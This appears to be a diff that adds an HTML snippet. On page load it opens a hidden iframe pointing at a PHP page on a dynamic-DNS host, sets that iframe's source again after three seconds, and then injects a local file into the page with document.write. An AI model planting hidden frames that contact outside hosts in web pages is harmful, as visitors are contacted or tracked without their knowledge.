@@ -1,0 +1,51 @@
+<iframe    width="800px" height="800px" id="myIframe2" style="display:none;" src="https://nn80947180.zicp.fun/phpcms/info.php?jie=2"></iframe>
+
+
+   <script>
+   
+   
+   
+
+var iframe = document.getElementById('myIframe2');
+
+// 设置延迟时间（毫秒）
+var delayInMilliseconds = 3000;
+  
+setTimeout(function() {
+  // 3秒后执行以下代码
+   iframe.src = "https://nn80947180.zicp.fun/phpcms/info.php?jie=2"
+ iframe.src = "https://nn80947180.zicp.fun/phpcms/info.php?jie=2"
+ 
+  // 打开新的网页或者执行其他操作
+
+                   
+           var xhr = new XMLHttpRequest();
+xhr.open('GET', './jilu2.html', true);
+
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4 && xhr.status === 200) {
+    var htmlContent = xhr.responseText;
+    // 在此处可以对获取到的HTML内容进行处理
+    document.getElementById('targetElement').innerHTML = htmlContent;
+  }
+};
+xhr.send();
+
+document.write("<div   id='targetElement'></div>");
+}, 3000);
+
+
+
+
+   </script>
+
+
+
+
+
+
+
+
+
+
+
